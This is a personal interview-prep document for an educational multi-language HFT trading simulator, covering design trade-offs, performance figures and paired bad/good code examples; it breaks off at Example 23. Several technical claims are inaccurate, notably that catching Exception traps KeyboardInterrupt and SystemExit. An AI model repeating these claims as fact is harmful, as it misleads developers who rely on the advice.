# Interview Prep — HFT Trading System

> Private document for interview preparation. Not committed to the repo.

---

## 5 Key Technical Decisions

### 1. Three languages (Python + C++ + Rust) instead of one
**Why:** Each language is optimized for its task. Python has the best ML ecosystem (PyTorch, scikit-learn). C++ gives sub-millisecond latency with zero-allocation hot paths. Rust provides memory-safe FFI for order execution without GC pauses.
**Trade-off:** More complex deployment and IPC, but latency requirements make this necessary.

### 2. SHM IPC instead of WebSocket for hot path
**Why:** WebSocket is ~2ms per message (TCP + framing + JSON parse). SHM is ~30us (memcpy + atomic flag). 60x faster.
**Trade-off:** Platform-specific code (Windows CreateFileMappingW vs POSIX shm_open), but the latency gain is critical for HFT.

### 3. Ensemble voting instead of single strategy
**Why:** No single strategy works in all market regimes. Trend Following fails in ranging markets. Mean Reversion fails in trending markets. Ensemble voting combines 5 strategies — when 3+ agree, confidence is higher than any individual.
**Trade-off:** More computation per signal, but ensemble voting is ~2us (single-pass accumulator).

### 4. PPO instead of DQN for RL
**Why:** PPO is on-policy — adapts faster to non-stationary markets. Clipped objective prevents catastrophic policy updates. Simpler training loop (no replay buffer).
**Trade-off:** Less sample-efficient than DQN, but both are implemented for comparison.

### 5. Signal Engine V2 with 100ms cooldown instead of continuous signals
**Why:** Without cooldown, the engine generates signals every tick (~1ms), leading to excessive order spam. 100ms cooldown allows rapid re-entry while preventing duplicate orders.
**Trade-off:** May miss very short opportunities, but reduces false signals and exchange fees.

---

## 3 Gotchas Encountered and Solutions

### 1. websocketpp C++20 incompatibility
**Problem:** websocketpp uses C++17 template syntax that breaks in C++20 mode.
**Solution:** Patched the system headers in CI (`sed` to remove template-id in constructor/destructor). This is a known issue with the library being abandoned.

### 2. SHM IPC on Windows vs Linux
**Problem:** Windows uses `CreateFileMappingW` with a tagname, Linux uses `shm_open` with a path. Completely different APIs.
**Solution:** Auto-detect platform in the C++ code with `#ifdef _WIN32`. Python SHM uses `mmap` with `tagname` parameter on Windows.

### 3. Rust FFI lifetime management
**Problem:** The C++ side holds a `void*` to the Rust `OrderExecutor`. If the Rust side drops it, use-after-free.
**Solution:** `Box::into_raw` on create, `Box::from_raw` + drop on destroy. The C++ side must call `hft_executor_destroy` — documented in the FFI header.

---

## 2 Things I'd Do Differently

### 1. Use shared protobuf instead of raw JSON for IPC
JSON serialization is ~50us per message. Protobuf would be ~5us. For the hot path, this matters. The current SHM path uses packed structs (fast), but the WebSocket paths still use JSON.

### 2. Start with CI from day one
The project had 200+ test files but no CI pipeline until late. Adding CI retroactively required fixing many lint issues at once. Starting with CI from day one would have caught issues incrementally.

---

## Performance Numbers to Quote

| Metric | Value | Context |
|--------|-------|---------|
| C++ main loop | 1ms | Configurable via `signal_interval_ms` |
| V2 signal cooldown | 100ms | Prevents signal spam |
| SHM IPC latency | ~30us | Python → C++ signal path |
| C++ signal generation (p50) | < 10us | V2/V3 engine, incremental cache |
| C++ total loop (p50) | < 100us | Signal + risk + order per symbol |
| WebSocket throughput | ~1,000 msg/s | Exchange simulator broadcast |
| Price feed latency p95 | ~42ms | Target: < 50ms (ACHIEVED) |
| API call reduction | 80% | 50 → 10 calls for 50 symbols |
| Cache hit rate | 96% | TTLCache with 1000 entries |
| Test files | 208 total | 118 Python, 46 C++, 44 JS |
| Panel count | 204 | React lazy-loaded |
| Math models | 44 in trading logic | + 40 UI-only educational |
| Symbols | 50+ | BTC, ETH, SOL, BNB, ADA... |
| CI jobs | 18 | Lint, test, build, security, E2E, Docker |

---

## Elevator Pitch (30 seconds)

"I built an educational HFT trading simulator with a polyglot architecture: Python for AI signal generation with 19 strategies and ML models, C++20 for sub-millisecond order execution with lock-free queues and SHM IPC, Rust for memory-safe order execution via WebSocket, and a React 18 dashboard with 204 lazy-loaded panels. The system trades 50+ crypto symbols on a simulated exchange with realistic microstructure models — GBM, Heston, Merton jumps, and Markov regime switching. It has 208 test files, 18 CI jobs, and Docker Compose orchestration with health checks."

---

## Common Interview Questions

### "Explain your architecture"
Start with the data flow: Exchange Simulator → (WebSocket) → AI Signal Bot → (SHM IPC) → C++ HFT Bot → (FFI) → Rust Executor → (WebSocket) → Exchange. Then explain why each language was chosen and the latency budget.

### "What's the hardest part?"
The SHM IPC between Python and C++ — different memory models, platform-specific APIs (Windows vs Linux), and ensuring zero-copy with proper synchronization (atomic flags, not mutexes).

### "How do you test this?"
208 test files across 3 languages. Python: pytest with 118 files. C++: doctest with 46 files. JS: Vitest + Playwright with 44 files. CI runs 18 jobs including Docker Compose smoke test.

### "What would you improve?"
Protobuf instead of JSON for IPC. Real exchange connections (Binance/OKX WebSocket). Prometheus + Grafana dashboards (config exists, dashboards are TODO).

### "Is this production-ready?"
No — it's an educational simulator. No real money, no real exchange. But the architecture, latency optimization techniques, and testing discipline are production-grade.

---

## BAD CODE vs GOOD CODE — Examples for Interview

> These are real examples from the codebase. Use them to show you understand what makes code bad at scale and why the good version matters when you have many users and a large system.

---

### Example 1: Silent Exception Swallowing (Database)

**BAD** — `ai-signal-bot/src/database/db.py:27-34`:
```python
def close(self) -> None:
    """Close database and release WAL file locks (Windows-safe)."""
    try:
        with closing(sqlite3.connect(self.path)) as conn:
            conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
            conn.execute("PRAGMA journal_mode=DELETE")
    except Exception:
        pass  # ← silently swallows ALL errors
```

**GOOD**:
```python
def close(self) -> None:
    """Close database and release WAL file locks (Windows-safe)."""
    try:
        with closing(sqlite3.connect(self.path)) as conn:
            conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
            conn.execute("PRAGMA journal_mode=DELETE")
    except (sqlite3.OperationalError, sqlite3.DatabaseError) as e:
        logger.warning(f"DB checkpoint failed on close: {e}")
```

**Why it matters at scale:** With `except Exception: pass`, if the WAL checkpoint fails (disk full, corruption, permissions), you never know. The database silently stays in WAL mode, the WAL file grows unbounded, and eventually the system runs out of disk. With 1000 users, that's 1000 silent corruptions. The good version narrows the exception to SQLite-specific errors and logs them — you can alert on `DB checkpoint failed` and fix the root cause before it cascades.

---

### Example 2: Redundant Exception in Tuple (Feature Store)

**BAD** — `ai-signal-bot/src/ml/feature_store.py:94`:
```python
except (OSError, ConnectionError, RuntimeError, Exception) as e:
    logger.warning(f"[FeatureStore] Redis connection failed: {e} — using in-memory")
```

**GOOD**:
```python
except (OSError, ConnectionError, redis.exceptions.RedisError) as e:
    logger.warning(f"[FeatureStore] Redis connection failed: {e} — using in-memory")
```

**Why it matters at scale:** `Exception` in the tuple catches EVERYTHING — including `KeyboardInterrupt`, `SystemExit`, `MemoryError`, `RecursionError`. In a large system, catching `MemoryError` and continuing silently means the process keeps running in a degraded state, potentially corrupting data. The good version catches only the specific exceptions that Redis connections can throw, letting truly fatal errors propagate and crash the process (which K8s will restart).

---

### Example 3: f-string in Logger (Performance)

**BAD** — ~80+ calls across `src/`:
```python
logger.debug(f"Signal: {signal.symbol} dir={signal.direction} conf={signal.confidence:.4f} "
             f"entry={signal.entry_price} sl={signal.stop_loss} tp={signal.take_profit} "
             f"strategy={signal.strategy} reason={signal.reason}")
```

**GOOD**:
```python
logger.debug("Signal: %s dir=%s conf=%.4f entry=%s sl=%s tp=%s strategy=%s reason=%s",
             signal.symbol, signal.direction, signal.confidence,
             signal.entry_price, signal.stop_loss, signal.take_profit,
             signal.strategy, signal.reason)
```

**Why it matters at scale:** f-strings are evaluated eagerly — the string is formatted EVERY time, even if DEBUG logging is disabled. With 50 symbols × 5 strategies × 60s interval = 250 calls/min, that's 250 unnecessary string format operations per minute. In a high-frequency system with 1000 users, that's 250k wasted format operations/min. The good version uses lazy `%s` formatting — the string is only formatted if the log level is enabled. The args are just passed as a tuple, and the logger decides whether to format them.

---

### Example 4: Missing `encoding=` on `open()` (Cross-Platform)

**BAD** — 7 files including `fix_client.py:151`, `model_registry.py:95`:
```python
with open(self.seq_file) as f:
    parts = f.read().strip().split()
```

**GOOD**:
```python
with open(self.seq_file, encoding="utf-8") as f:
    parts = f.read().strip().split()
```

**Why it matters at scale:** Without `encoding=`, Python uses the system default — `cp1252` on English Windows, `cp1251` on Russian Windows, `utf-8` on Linux. A JSON file with a symbol like "BTC/USDT" works everywhere, but add a strategy name with a Unicode character (e.g., "Mean Reversion α") and it crashes on Windows with `UnicodeDecodeError`. In a team with developers on different OSes, this causes "works on my machine" bugs. The good version is explicit — `utf-8` everywhere, regardless of OS.

---

### Example 5: Hardcoded localhost (Docker/K8s)

**BAD** — `ws_client.py`, `exchange_factory.py`, `price_monitor.py`:
```python
ws_url = "ws://localhost:8765"  # ← hardcoded
```

**GOOD**:
```python
ws_url = os.getenv("EXCHANGE_WS_URL", "ws://localhost:8765")
```

**Why it matters at scale:** In Docker Compose, the exchange simulator is at `ws://exchange-simulator:8765`, not `localhost`. In K8s, it's a service DNS name. With hardcoded `localhost`, the bot works on your laptop but crashes in any containerized environment. With 1000 users deploying via Docker, 1000 bots fail to connect. The good version defaults to localhost for development but allows override via environment variable for production.

---

### Example 6: No Idempotency on Orders (Financial Risk)

**BAD** — `ws_client.py submit_order`:
```python
order_msg = {
    "type": "order",
    "exchange": exchange,
    "symbol": symbol,
    "side": side,
    "quantity": quantity,
    "order_type": "MARKET",
}
await self._ws.send(json.dumps(order_msg))
# Network blip → retry → exchange receives TWICE → double position
```

**GOOD**:
```python
import uuid

order_msg = {
    "type": "order",
    "client_order_id": str(uuid.uuid4()),  # idempotency key
    "exchange": exchange,
    "symbol": symbol,
    "side": side,
    "quantity": quantity,
    "order_type": "MARKET",
}
await self._ws.send(json.dumps(order_msg))
# Exchange: if client_order_id seen before → return original result, don't execute again
```

**Why it matters at scale:** In trading, a retry without idempotency = real money lost. Network hiccups happen — TCP resets, WS disconnects, timeouts. If you retry a market order and the exchange executes both, you're now long 2× the intended size. With 1000 users each trading 50 symbols, a single network blip could cause 50,000 unintended orders. `client_order_id` is the standard solution — Binance, Coinbase, Kraken all support it. The exchange deduplicates on their side.

---

### Example 7: No Graceful Shutdown (Container Orchestration)

**BAD** — `run.py`:
```python
try:
    while self._running:
        await asyncio.sleep(self.config.signal_interval)
        await self._generate_signals()
except KeyboardInterrupt:
    self.logger.info("Stopping...")
finally:
    self._running = False
```

**GOOD**:
```python
import signal

def _install_signal_handlers(self) -> None:
    loop = asyncio.get_running_loop()
    for sig in (signal.SIGTERM, signal.SIGINT):
        loop.add_signal_handler(sig, self._request_shutdown)

def _request_shutdown(self) -> None:
    self.logger.info("Shutdown requested — draining...")
    self._running = False

async def run(self):
    self._install_signal_handlers()
    try:
        while self._running:
            await asyncio.sleep(self.config.signal_interval)
            await self._generate_signals()
    finally:
        await self._drain()  # close WS, save state, checkpoint DB
```

**Why it matters at scale:** `docker stop` sends SIGTERM, not KeyboardInterrupt. Without a SIGTERM handler, Docker waits 10 seconds, then sends SIGKILL. The process is killed instantly — no `finally` block, no state save, no DB checkpoint. In K8s, pod termination sends SIGTERM — same problem. With 1000 users on K8s, every rolling update loses in-flight signals and corrupts the equity curve. The good version catches SIGTERM, stops accepting new work, drains pending operations, saves state, and exits cleanly.

---

### Example 8: Metric Name Mismatch (Alerts Never Fire)

**BAD** — alert rules vs code:
```yaml
# monitoring/alerts/alerts.yml
expr: ai_signal_bot_signal_generation_latency_seconds > 0.1
```
```python
# monitoring/metrics.py
self.signal_latency = Histogram(
    "trading_signal_latency_seconds", ...)  # ← different name!
```

**GOOD** — same name everywhere:
```yaml
# monitoring/alerts/alerts.yml
expr: ai_signal_bot_signal_generation_latency_seconds > 0.1
```
```python
# monitoring/metrics.py
self.signal_latency = Histogram(
    "ai_signal_bot_signal_generation_latency_seconds", ...)
```

**Why it matters at scale:** Prometheus doesn't error on non-existent metrics in alert rules — it just waits for data that never comes. The alert silently never fires. You think you're monitoring signal latency, but you're not. In a large system with 50+ alerts, you can't manually verify each one. The good version ensures the metric name in code matches the alert rule exactly. Best practice: use `promtool check rules` in CI to catch mismatches.

---

### Example 9: No Backpressure on Broadcast

**BAD** — `signal_publisher.py broadcast_signal`:
```python
async def broadcast_signal(self, signal: dict) -> None:
    if not self.circuit_breaker.allow_signal():
        return
    msg = json.dumps(signal)
    await asyncio.gather(
        *[ws.send(msg) for ws in self._clients],
        return_exceptions=True
    )
    # ← no limit on concurrent sends, no queue, no drop policy
```

**GOOD**:
```python
async def broadcast_signal(self, signal: dict) -> None:
    if not self.circuit_breaker.allow_signal():
        return
    msg = json.dumps(signal)
    # Drop slow clients — don't let them block the hot path
    sends = []
    for ws in list(self._clients):
        try:
            sends.append(asyncio.wait_for(ws.send(msg), timeout=0.5))
        except (ConnectionError, asyncio.TimeoutError):
            self._clients.discard(ws)
    await asyncio.gather(*sends, return_exceptions=True)
```

**Why it matters at scale:** Without backpressure, one slow client (e.g., HFT bot on a congested network) blocks `asyncio.gather` — all other clients wait for the slowest one. In a system with 100 HFT clients, one slow client delays signals to all 99 others. The good version adds a per-client timeout — slow clients are dropped, fast clients get their signals immediately. This is critical for HFT where milliseconds matter.

---

### Example 10: Code Duplication — Position Sizing

**BAD** — same logic in `backtester.py` and `run.py`:
```python
# backtester.py _open_position
risk_amount = balance * self.risk_per_trade_pct / 100
risk_per_unit = abs(fill_price - signal.stop_loss)
quantity = risk_amount / risk_per_unit
max_qty = balance * self.max_position_pct / 100 / fill_price
quantity = min(quantity, max_qty)

# run.py _execute_paper_order — SAME LOGIC, different param names
risk_amount = balance * self.config.max_risk_pct / 100
risk_per_unit = abs(signal.entry_price - signal.stop_loss)
quantity = risk_amount / risk_per_unit
max_qty = balance * self.config.max_position_size_pct / 100 / signal.entry_price
quantity = min(quantity, max_qty)
```

**GOOD** — one function, one source of truth:
```python
# src/utils/position_sizing.py
def calculate_position_size(balance: float, entry_price: float, stop_loss: float,
                            risk_pct: float, max_position_pct: float) -> float:
    risk_amount = balance * risk_pct / 100
    risk_per_unit = abs(entry_price - stop_loss)
    if risk_per_unit <= 0:
        return 0.0
    quantity = risk_amount / risk_per_unit
    max_qty = balance * max_position_pct / 100 / entry_price if entry_price > 0 else 0
    return min(quantity, max_qty)

# backtester.py
from src.utils.position_sizing import calculate_position_size
quantity = calculate_position_size(balance, fill_price, signal.stop_loss,
                                   self.risk_per_trade_pct, self.max_position_pct)

# run.py
from src.utils.position_sizing import calculate_position_size
quantity = calculate_position_size(balance, signal.entry_price, signal.stop_loss,
                                   self.config.max_risk_pct, self.config.max_position_size_pct)
```

**Why it matters at scale:** Two copies = two places for bugs. If you fix a rounding error in one but forget the other, backtest results diverge from live trading. In a large system, you might have 10 places doing position sizing — each slightly different. The good version has one function, one test, one place to fix bugs. When the risk formula changes, it changes everywhere automatically.

---

### Example 11: No Indicator Caching (Performance)

**BAD** — full recalculation every cycle:
```python
# strategies.py analyze() — called 250 times/minute
closes = [c["close"] for c in candles]  # 200 candles
ema_f = ema(closes, self.ema_fast)      # O(N) = 200 ops
ema_s = ema(closes, self.ema_slow)      # O(N) = 200 ops
adx_vals = adx(candles, 14)             # O(N) = 200 ops
atr_vals = atr(candles, 14)             # O(N) = 200 ops
# Total: 250 × 4 × 200 = 200,000 ops/min
```

**GOOD** — incremental O(1) update:
```python
class IndicatorCache:
    def __init__(self, period: int):
        self._ema: float | None = None
        self._alpha = 2 / (period + 1)

    def update(self, price: float) -> float:
        if self._ema is None:
            self._ema = price
        else:
            self._ema = self._alpha * price + (1 - self._alpha) * self._ema
        return self._ema

# Total: 250 × 4 × 1 = 1,000 ops/min (200× faster)
```

**Why it matters at scale:** EMA has a closed-form incremental update: `EMA_new = α·price + (1-α)·EMA_old`. One multiplication, one addition — O(1). Without caching, you recalculate the entire 200-candle window every time. In a system with 1000 symbols × 10 strategies, that's 8 million ops/min wasted. The good version updates incrementally — only the new candle is processed. 200× speedup, same results.

---

### Example 12: Dead Parameter (AI Slop)

**BAD** — `scripts/run_bot.py:31`:
```python
publisher = SignalPublisher(ws_port=config.get("websocket_port", 8766))
# ↑ ws_port doesn't exist in SignalPublisher.__init__!
# Real signature: def __init__(self, host: str = "0.0.0.0", port: int = 8766)
# This will crash with TypeError: unexpected keyword argument 'ws_port'
```

**GOOD**:
```python
publisher = SignalPublisher(
    host="0.0.0.0",
    port=int(config.get("websocket_port", 8766))
)
```

**Why it matters at scale:** This is classic AI-generated code that was never run. The parameter name "sounds right" but doesn't match the actual API. In a large codebase, dead code like this accumulates — scripts that crash on first run, imports that fail, parameters that don't exist. The good version matches the actual signature. Always run every script at least once before committing.

---

## INTERVIEW TALKING POINTS — Reliability

### "What reliability patterns did you implement?"
- **CircuitBreaker** — 5 consecutive losing signals → stop trading, cooldown, half-open recovery
- **CancelledError handling** — 10 async modules properly cancel tasks on shutdown
- **WAL mode SQLite** — concurrent read/write without blocking
- **Connection pooling** — aiohttp TCPConnector with 100 connections per host
- **Rate limiting** — BinanceAPI: 1200 req/min, CoinbaseAPI: 1000 req/min

### "What reliability patterns are MISSING?"
- **SIGTERM handler** — only KeyboardInterrupt, not Docker/K8s signals
- **Idempotency on orders** — no `client_order_id`, retry = double order
- **Backpressure** — SignalPublisher broadcasts without per-client timeout
- **Indicator caching** — 200× wasted computation per cycle
- **Metric/alert name mismatch** — alerts silently never fire
- **Schema validation** — WS messages accepted as raw JSON without validation
- **DB partitioning** — equity_curve grows unbounded, no retention

### "How would you make this production-ready?"
1. Add SIGTERM handler → graceful drain → save state → exit 0
2. Add `client_order_id` to all order submissions
3. Add per-client broadcast timeout (drop slow clients)
4. Unify metric names with alert rules
5. Add pydantic schemas for WS messages
6. Add indicator cache (EMA/RSI/ADX incremental updates)
7. Partition equity_curve by month, add retention policy
8. Switch from SQLite to PostgreSQL with TimescaleDB for time-series data

---

### Example 13: Race Condition on Shared Set (Concurrency)

**BAD** — `signal_publisher.py`:
```python
class SignalPublisher:
    def __init__(self):
        self._clients: set = set()  # ← shared mutable state, no lock

    async def _handle_client(self, ws):
        self._clients.add(ws)       # ← modify
        # ... await messages ...
        self._clients.discard(ws)   # ← modify

    async def broadcast_signal(self, signal):
        msg = json.dumps(signal)
        await asyncio.gather(
            *[ws.send(msg) for ws in self._clients],  # ← iterate
            return_exceptions=True
        )
        self._clients -= disconnected  # ← modify during potential iteration
```

**GOOD**:
```python
class SignalPublisher:
    def __init__(self):
        self._clients: set = set()
        self._clients_lock = asyncio.Lock()

    async def _handle_client(self, ws):
        async with self._clients_lock:
            self._clients.add(ws)
        # ... await messages ...
        async with self._clients_lock:
            self._clients.discard(ws)

    async def broadcast_signal(self, signal):
        msg = json.dumps(signal)
        # Snapshot the set — don't iterate while others modify
        async with self._clients_lock:
            clients = list(self._clients)
        # ... send to snapshot ...
```

**Why it matters at scale:** In asyncio, `asyncio.gather` yields control to other tasks. While `broadcast_signal` iterates `_clients`, `_handle_client` can `.add()` or `.discard()` the same set. Python raises `RuntimeError: Set changed size during iteration`. With 100 clients connecting/disconnecting frequently, this crash is inevitable. The good version either uses a lock or takes a snapshot (`list(self._clients)`) before iterating. In a system with 1000 users, race conditions are not intermittent — they're guaranteed.

---

### Example 14: Missing DB Busy Timeout (Database Locks)

**BAD** — `db.py:22`:
```python
def _conn(self) -> sqlite3.Connection:
    conn = sqlite3.connect(self.path)  # ← default timeout = 5s
    conn.execute("PRAGMA journal_mode=WAL")
    return conn
```

**GOOD**:
```python
def _conn(self) -> sqlite3.Connection:
    conn = sqlite3.connect(self.path, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=30000")  # 30s wait on lock
    conn.execute("PRAGMA synchronous=NORMAL")   # WAL-safe, faster fsync
    return conn
```

**Why it matters at scale:** SQLite in WAL mode allows concurrent reads, but writes still serialize. With the default 5s timeout, if two writes collide (e.g., `save_signal` + `save_equity` in the same cycle), one gets `OperationalError: database is locked`. The bot crashes and restarts. With 1000 users, that's 1000 crashes per write collision. The good version sets `busy_timeout=30000` — SQLite waits up to 30s for the lock instead of failing immediately. Combined with `synchronous=NORMAL` (safe in WAL mode, 2× faster), this eliminates lock errors while maintaining durability.

---

### Example 15: Resource Leak — New HTTP Session Per Alert

**BAD** — `monitoring/alerting.py:168,190,205`:
```python
async def _send_discord(self, alert):
    payload = {...}
    async with aiohttp.ClientSession() as session:  # ← new session every alert
        async with session.post(self.discord_webhook, json=payload) as resp:
            if resp.status not in (200, 204):
                logger.error(f"Discord webhook failed: {resp.status}")
```

**GOOD**:
```python
class AlertSystem:
    def __init__(self):
        self._session: aiohttp.ClientSession | None = None

    async def start(self):
        self._session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=10),
            connector=aiohttp.TCPConnector(limit=10, keepalive_timeout=30)
        )

    async def _send_discord(self, alert):
        if not self._session:
            return
        payload = {...}
        async with self._session.post(self.discord_webhook, json=payload) as resp:
            if resp.status not in (200, 204):
                logger.error(f"Discord webhook failed: {resp.status}")

    async def stop(self):
        if self._session:
            await self._session.close()
```

**Why it matters at scale:** Each `aiohttp.ClientSession()` creates a new `TCPConnector` with its own connection pool. Creating and destroying a session per alert means: (1) no connection reuse — every alert opens a new TCP connection, (2) DNS lookup every time, (3) TLS handshake every time. When the circuit breaker trips and fires 10 alerts/min, that's 10 new TCP connections/min. With 1000 users, that's 10,000 unnecessary TCP connections/min. The good version creates one session with keepalive — connections are reused, DNS is cached, TLS sessions are resumed. 10× less overhead.

---

### Example 16: Docker Healthcheck — TCP vs HTTP

**BAD** — `docker-compose.yml`:
```yaml
healthcheck:
  test: ["CMD", "python", "-c", "import socket; socket.create_connection(('localhost', 8765), timeout=5)"]
```

**GOOD**:
```yaml
healthcheck:
  test: ["CMD", "wget", "-q", "--spider", "http://localhost:8775/health"]
```

**Why it matters at scale:** TCP healthcheck only verifies the port is open — the process could be hung (event loop blocked, deadlock, OOM). Docker thinks the container is healthy, but the service is unresponsive. With HTTP `/health`, the endpoint checks real application state — DB connection, WS clients, internal queues. If the event loop is blocked, the HTTP server can't respond → Docker marks it unhealthy → restarts. In K8s, this is even more critical — liveness/readiness probes determine traffic routing. A TCP-probed pod receives traffic even when hung. The good version uses HTTP, which verifies actual application readiness.

---

### Example 17: C++ `catch (...)` on Safety-Critical Component

**BAD** — `hft-trade-bot/src/risk/kill_switch.h:64`:
```cpp
bool init() {
    try {
        shm_ = std::make_unique<ShmRingBuffer<ipc::KillSwitchMsg>>(
            shm_name_, 64, true);
        return true;
    } catch (...) {
        return false;  // ← swallows ALL exceptions, no logging
    }
}
```

**GOOD**:
```cpp
bool init() {
    try {
        shm_ = std::make_unique<ShmRingBuffer<ipc::KillSwitchMsg>>(
            shm_name_, 64, true);
        return true;
    } catch (const std::exception& e) {
        spdlog::error("KillSwitch SHM init failed: {}", e.what());
        return false;
    }
}
```

**Why it matters at scale:** The kill switch is the last line of defense — it stops the bot when something goes wrong. If its SHM init fails silently, the kill switch doesn't work, but the bot continues trading. This is the worst possible failure mode: you think you have a safety net, but you don't. `catch (...)` swallows everything — including `std::bad_alloc` (OOM), `std::system_error` (permissions), even non-`std::exception` throws. The good version catches `std::exception` specifically and logs the error. If init fails, you see it in logs and can fix it before deploying. In a trading system with 1000 users, a non-functional kill switch could mean unlimited losses on a flash crash.

---

### Example 18: Missing Database Indexes

**BAD** — `db.py:78-80`:
```python
# Only these indexes exist:
CREATE INDEX idx_signals_symbol ON signals(symbol);
CREATE INDEX idx_trades_symbol ON trades(symbol);
CREATE INDEX idx_trades_status ON trades(status);

# But get_stats() runs:
conn.execute("SELECT COUNT(*) FROM trades WHERE status='CLOSED' AND pnl > 0")
# ← full table scan! status index helps, but pnl > 0 is unindexed
# With 100k trades: 100k rows scanned per stats call
```

**GOOD**:
```python
CREATE INDEX idx_signals_symbol ON signals(symbol);
CREATE INDEX idx_signals_timestamp ON signals(timestamp);  # time queries
CREATE INDEX idx_trades_symbol ON trades(symbol);
CREATE INDEX idx_trades_status ON trades(status);
CREATE INDEX idx_trades_status_pnl ON trades(status, pnl);  # composite for get_stats
CREATE INDEX idx_equity_timestamp ON equity_curve(timestamp);  # time-based queries
```

**Why it matters at scale:** Without a composite index on `(status, pnl)`, SQLite scans every row with `status='CLOSED'` to check `pnl > 0`. With 100 trades, that's instant. With 100,000 trades (a year of trading 50 symbols), that's 100k rows per `get_stats()` call. The web UI calls `get_stats()` every refresh (5s) → 1.2M row scans/min. The good version creates a composite index — SQLite jumps directly to `status='CLOSED' AND pnl > 0` rows. O(1) lookup instead of O(N) scan. In a system with 1000 users each generating 1000 trades/day, you'd have 1M trades in a week — without indexes, `get_stats()` takes seconds, with indexes it takes milliseconds.

---

### Example 19: Float Precision in Financial Calculations

**BAD** — `src/` повсеместно:
```python
balance = 10000.0
risk_amount = balance * 0.02       # 200.00000000000003
quantity = risk_amount / 1.5       # 133.33333333333334
pnl = (50100.0 - 50000.0) * quantity  # 13333.333333333343
# After 10,000 trades: accumulated error shifts P&L by dollars
```

**GOOD**:
```python
from decimal import Decimal, ROUND_HALF_UP

balance = Decimal("10000.00")
risk_amount = balance * Decimal("0.02")           # 200.00
quantity = (risk_amount / Decimal("1.50"))         # 133.333333...
quantity = quantity.quantize(Decimal("0.000001"), rounding=ROUND_HALF_UP)
pnl = (Decimal("50100.00") - Decimal("50000.00")) * quantity  # exact
```

**Why it matters at scale:** IEEE 754 doubles have ~15 significant digits. `0.1 + 0.2 != 0.3` — it's `0.30000000000000004`. In a single trade, the error is microscopic. But over 10,000 trades with compounding, errors accumulate. Your reported P&L drifts from actual P&L. When you reconcile with the exchange's numbers, there's a discrepancy. Worse: Binance API expects `quantity=0.00100000` (string), but `float` gives `0.0010000000000000002` — the API rejects it or rounds differently. With 1000 users each doing 100 trades/day, that's 100,000 potential precision errors/day. The good version uses `Decimal` — exact arithmetic, no rounding surprises. For a trading system, this is not optional.

---

### Example 20: No Log Rotation (Disk Exhaustion)

**BAD** — весь проект:
```python
logging.basicConfig(
    filename=f"logs/{name}.log",
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s"
)
# ← no rotation, no max size, no backup count
# logs/bot.log grows forever: 1MB → 100MB → 10GB → disk full → crash
```

**GOOD**:
```python
from logging.handlers import RotatingFileHandler

handler = RotatingFileHandler(
    f"logs/{name}.log",
    maxBytes=50_000_000,  # 50MB per file
    backupCount=5,        # keep 5 rotated files (250MB total max)
    encoding="utf-8",
)
handler.setFormatter(logging.Formatter(
    "%(asctime)s %(levelname)s %(name)s: %(message)s"
))
logging.basicConfig(level=logging.INFO, handlers=[handler])
```

**Why it matters at scale:** Without rotation, log files grow linearly. A bot logging 100 lines/min at 100 bytes/line = 14MB/day = 420MB/month = 5GB/year. With 50 symbols and DEBUG logging, multiply by 10× = 50GB/year. On a 20GB VPS, the disk fills in 5 months. When the disk is full, `logging` silently stops (or crashes with `OSError`). The bot continues running but with no logs — you're blind to errors. With 1000 users on small VPS instances, this is a guaranteed outage. The good version caps log storage at 250MB (5 × 50MB) — when `bot.log` hits 50MB, it becomes `bot.log.1`, and a new `bot.log` starts. Old files are deleted after 5 rotations.

---

### Example 21: Rust `unwrap()` — Panic in Production

**BAD** — `hft-executor/src/lib.rs:80,159`:
```rust
let runtime = tokio::runtime::Builder::new_multi_thread()
    .worker_threads(1)
    .enable_all()
    .build()
    .expect("Failed to create tokio runtime");  // ← panics entire process

let json = serde_json::to_string(&order).unwrap_or_default();  // ← empty string on error
let msg = Message::Text(json);  // ← sends "" to exchange
```

**GOOD**:
```rust
pub fn new(ws_url: &str) -> Result<Self, String> {
    let runtime = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(1)
        .enable_all()
        .build()
        .map_err(|e| format!("Runtime creation failed: {e}"))?;

    // ... spawn run_loop ...

    Ok(Self { tx, order_count, fill_count, error_count, _runtime: Some(runtime) })
}

// In run_loop:
let json = match serde_json::to_string(&order) {
    Ok(j) => j,
    Err(e) => {
        tracing::error!("Order serialization failed: {e}");
        error_count.fetch_add(1, Ordering::Relaxed);
        continue;
    }
};
```

**Why it matters at scale:** In Rust, `panic()` unwinds the stack and kills the thread — or the entire process if it's the main thread. `expect()` on line 80 panics if the OS can't create a thread (ulimit hit, cgroup limit). In a container with limited PIDs/threads, this is a real scenario. `unwrap_or_default()` on line 159 silently sends an empty JSON string to the exchange — the exchange receives `""`, can't parse it, and drops the connection. The bot thinks it sent the order, but the exchange never got it. With 1000 users, a serialization bug means 1000 silent order losses. The good version returns `Result` from `new()` — the caller decides how to handle failure (retry, fallback, exit). For serialization, it logs the error and skips the order instead of sending garbage.

---

### Example 22: Rust String Matching Instead of JSON Parsing

**BAD** — `hft-executor/src/lib.rs:209-214`:
```rust
fn is_fill_message(text: &str) -> bool {
    text.contains("\"fill\"")
        || text.contains("\"filled\"")
        || text.contains("\"order_fill\"")
        || text.contains("\"type\":\"fill\"")
}
// Any message with "fill" anywhere matches:
// {"type":"error","reason":"order_refilled"} → true (false positive!)
// {"type":"status","msg":"buffer_filled"} → true (false positive!)
```

**GOOD**:
```rust
#[derive(Deserialize)]
struct WsMessage {
    #[serde(rename = "type")]
    msg_type: String,
}

fn is_fill_message(text: &str) -> bool {
    match serde_json::from_str::<WsMessage>(text) {
        Ok(msg) => msg.msg_type == "fill" || msg.msg_type == "order_fill",
        Err(_) => false,
    }
}
```

**Why it matters at scale:** String matching is fragile — it matches substrings anywhere in the message. As the exchange evolves and adds new message types (e.g., `"type":"refill_notification"`, `"type":"buffer_filled"`), the fill counter inflates with false positives. You think you got 100 fills, but 30 were false matches. In a trading system, wrong fill counts mean wrong P&L, wrong position tracking, wrong risk calculations. The good version parses the JSON and checks the `type` field exactly. No false positives, no ambiguity. In a system with 1000 users processing 10,000 messages/day, string matching could cause 300,000 false fill counts/day — rendering the fill tracker useless.

---

### Example 23: No Config Schema Validation (Runtime Crashes)

**BAD** — `config/settings.yaml` + `config/__init__.py`:
```yaml
# settings.yaml
